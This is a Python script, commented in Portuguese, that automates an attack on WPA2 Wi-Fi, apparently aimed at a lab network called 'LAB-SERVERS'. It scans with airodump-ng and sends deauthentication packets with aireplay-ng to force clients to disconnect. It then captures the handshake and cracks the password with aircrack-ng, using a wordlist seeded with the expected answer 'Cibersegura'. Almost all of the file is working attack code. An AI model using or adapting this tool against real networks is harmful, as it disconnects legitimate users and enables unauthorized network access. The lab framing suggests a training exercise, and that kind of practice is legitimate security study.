#!/usr/bin/env python3
"""
WiFi WPA2 Cracking Module para LAB-SERVERS
Captura handshake e cracka password "Cibersegura"

Uso:
    python wifi_cracker.py --network "LAB-SERVERS" --wordlist wordlists/custom.txt
    python wifi_cracker.py --network "LAB-SERVERS" --monitor wlan0mon --aireplay
"""

import subprocess
import os
import sys
import json
import time
import argparse
from pathlib import Path
from datetime import datetime
from typing import Optional, Dict, List

class WiFiCracker:
    """Cracka redes WPA2 usando aircrack-ng"""
    
    def __init__(self, monitor_iface: str = "wlan0mon", output_dir: str = "results"):
        self.monitor_iface = monitor_iface
        self.output_dir = output_dir
        Path(output_dir).mkdir(exist_ok=True)
        self.timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
    def check_monitor_mode(self) -> bool:
        """Verifica se interface esta em modo monitor"""
        try:
            result = subprocess.run(
                ["iwconfig", self.monitor_iface],
                capture_output=True,
                text=True,
                timeout=5
            )
            return "Monitor" in result.stdout
        except:
            print(f" Interface {self.monitor_iface} no encontrada!")
            print("Activate monitor mode:")
            print(f"  sudo airmon-ng start wlan0")
            return False
    
    def scan_networks(self, timeout: int = 30) -> List[Dict]:
        """Escaneia redes WiFi disponveis"""
        print(f" Escaneando redes por {timeout}seg...")
        
        capture_file = f"{self.output_dir}/scan_{self.timestamp}.cap"
        
        try:
            # Executar airodump-ng
            process = subprocess.Popen(
                ["sudo", "airodump-ng", "-w", capture_file, self.monitor_iface],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            time.sleep(timeout)
            process.terminate()
            process.wait(timeout=5)
            
            # Parse resultados
            csv_file = f"{capture_file}-01.csv"
            networks = self._parse_airodump_csv(csv_file)
            
            return networks
        except Exception as e:
            print(f" Erro ao escanear: {e}")
            return []
    
    def _parse_airodump_csv(self, csv_file: str) -> List[Dict]:
        """Parse do ficheiro CSV do airodump-ng"""
        networks = []
        try:
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                in_network_section = False
                for line in f:
                    if "BSSID, First seen" in line:
                        in_network_section = True
                        continue
                    if in_network_section and line.strip() and "Station MAC" not in line:
                        parts = [p.strip() for p in line.split(',')]
                        if len(parts) >= 14 and parts[0]:
                            networks.append({
                                'bssid': parts[0],
                                'power': parts[1],
                                'beacons': parts[2],
                                'data': parts[3],
                                'pwr': parts[4],
                                'packets': parts[5],
                                'handshake': parts[6],
                                'security': parts[7],
                                'cipher': parts[8],
                                'auth': parts[9],
                                'essid': parts[13]
                            })
        except FileNotFoundError:
            pass
        
        return networks
    
    def capture_handshake(self, bssid: str, essid: str, timeout: int = 120) -> bool:
        """Captura WPA handshake forcando reconexo"""
        print(f" Capturando handshake para {essid} ({bssid})...")
        
        capture_file = f"{self.output_dir}/handshake_{essid}_{self.timestamp}"
        
        try:
            # Start airodump-ng para capturar
            airodump = subprocess.Popen(
                ["sudo", "airodump-ng", "-c", "6", "-d", bssid, "-w", capture_file, self.monitor_iface],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            # Esperar um pouco antes de forar desconexo
            time.sleep(5)
            
            # Forar desconexo com aireplay-ng (deauth attack)
            print(f"    Enviando deauth packets (desligando clientes)...")
            for i in range(3):
                subprocess.run(
                    ["sudo", "aireplay-ng", "-0", "5", "-a", bssid, self.monitor_iface],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    timeout=10
                )
                time.sleep(3)
            
            # Esperar captura
            print(f"   Aguardando handshake (mx {timeout}seg)...")
            start = time.time()
            
            while time.time() - start < timeout:
                cap_file = f"{capture_file}-01.cap"
                if os.path.exists(cap_file):
                    # Verificar se tem handshake
                    result = subprocess.run(
                        ["aircrack-ng", cap_file, "-l", "-"],
                        capture_output=True,
                        text=True,
                        timeout=5
                    )
                    if "1 handshake" in result.stdout or "WPA" in result.stdout:
                        print(f"   Handshake capturado!")
                        airodump.terminate()
                        return cap_file
                
                time.sleep(2)
            
            print(f"   Timeout - handshake no capturado")
            airodump.terminate()
            return None
            
        except Exception as e:
            print(f" Erro ao capturar: {e}")
            return None
    
    def crack_password(self, cap_file: str, bssid: str, essid: str, 
                       wordlist: str = "wordlists/custom.txt") -> Optional[str]:
        """Cracka password WPA2 usando wordlist"""
        
        if not os.path.exists(wordlist):
            print(f"  Wordlist no encontrada: {wordlist}")
            print(f"  Criar com: python tools/wordlist_generator.py")
            return None
        
        print(f" Cracking {essid}...")
        print(f"  Usando: {wordlist}")
        print(f"  Handshake: {cap_file}")
        
        try:
            result = subprocess.run(
                ["sudo", "aircrack-ng", "-w", wordlist, "-b", bssid, cap_file],
                capture_output=True,
                text=True,
                timeout=300  # 5 minutos max
            )
            
            # Parse resultado
            for line in result.stdout.split('\n'):
                if "KEY FOUND!" in line:
                    # Extract password
                    password = line.split('[')[-1].split(']')[0]
                    print(f"   PASSWORD ENCONTRADA: {password}")
                    return password
                elif "Parsing" in line or "Testing" in line:
                    print(f"  {line}")
            
            print(f"   Password no encontrada na wordlist")
            return None
            
        except subprocess.TimeoutExpired:
            print(f"   Timeout aps 5 minutos")
            return None
        except Exception as e:
            print(f"   Erro: {e}")
            return None
    
    def save_results(self, results: Dict):
        """Salva resultados em JSON"""
        output_file = f"{self.output_dir}/wifi_crack_results_{self.timestamp}.json"
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        print(f" Resultados salvos: {output_file}")
        return output_file

def main():
    parser = argparse.ArgumentParser(description="WiFi WPA2 Cracker")
    parser.add_argument("--network", required=True, help="Nome da rede (ESSID)")
    parser.add_argument("--bssid", help="BSSID (skipa scan se fornecido)")
    parser.add_argument("--monitor", default="wlan0mon", help="Interface monitor (default: wlan0mon)")
    parser.add_argument("--wordlist", default="wordlists/custom.txt", help="Ficheiro de passwords")
    parser.add_argument("--scan-only", action="store_true", help="Apenas scanear redes")
    parser.add_argument("--timeout", type=int, default=120, help="Timeout para captura (seg)")
    parser.add_argument("--output", default="results", help="Diretrio de output")
    
    args = parser.parse_args()
    
    # Criar wordlist customizada se no existir
    if not os.path.exists(args.wordlist):
        print(f" Criando wordlist com 'Cibersegura'...")
        Path("wordlists").mkdir(exist_ok=True)
        with open(args.wordlist, 'w') as f:
            f.write("Cibersegura\n")
            f.write("password123\n")
            f.write("admin\n")
            f.write("123456\n")
        print(f" Wordlist criada: {args.wordlist}")
    
    cracker = WiFiCracker(monitor_iface=args.monitor, output_dir=args.output)
    
    # Verificar monitor mode
    if not cracker.check_monitor_mode():
        print(" Ative monitor mode primeiro:")
        print(f"  sudo airmon-ng start wlan0")
        sys.exit(1)
    
    print(" Interface em modo monitor!")
    print()
    
    # Escanear redes
    print("=" * 80)
    print("FASE 1: SCANNING")
    print("=" * 80)
    networks = cracker.scan_networks(timeout=30)
    
    if not networks:
        print(" Nenhuma rede encontrada!")
        sys.exit(1)
    
    # Mostrar redes
    print(f"\n {len(networks)} redes encontradas:\n")
    for i, net in enumerate(networks, 1):
        print(f"  {i}. {net['essid']:20} | {net['bssid']} | {net['security']}")
    
    if args.scan_only:
        return
    
    # Encontrar rede alvo
    target_network = None
    if args.bssid:
        target_network = next((n for n in networks if n['bssid'] == args.bssid), None)
    else:
        target_network = next((n for n in networks if args.network.lower() in n['essid'].lower()), None)
    
    if not target_network:
        print(f"\n Rede '{args.network}' no encontrada!")
        sys.exit(1)
    
    print(f"\n Alvo: {target_network['essid']} ({target_network['bssid']})")
    print()
    
    # Capturar handshake
    print("=" * 80)
    print("FASE 2: CAPTURA DE HANDSHAKE")
    print("=" * 80)
    
    cap_file = cracker.capture_handshake(
        target_network['bssid'],
        target_network['essid'],
        timeout=args.timeout
    )
    
    if not cap_file:
        print("\n Falha ao capturar handshake!")
        sys.exit(1)
    
    print()
    
    # Crackar password
    print("=" * 80)
    print("FASE 3: CRACKING")
    print("=" * 80)
    
    password = cracker.crack_password(
        cap_file,
        target_network['bssid'],
        target_network['essid'],
        args.wordlist
    )
    
    # Salvar resultados
    results = {
        "timestamp": cracker.timestamp,
        "network": target_network['essid'],
        "bssid": target_network['bssid'],
        "security": target_network['security'],
        "capture_file": cap_file,
        "password": password,
        "wordlist": args.wordlist,
        "status": "SUCCESS" if password else "FAILED"
    }
    
    cracker.save_results(results)
    
    # Resumo
    print()
    print("=" * 80)
    print("RESUMO")
    print("=" * 80)
    print(f"Rede    : {target_network['essid']}")
    print(f"BSSID   : {target_network['bssid']}")
    print(f"Captura : {cap_file}")
    print(f"Password: {password or ' No encontrada'}")
    print()

if __name__ == "__main__":
    main()
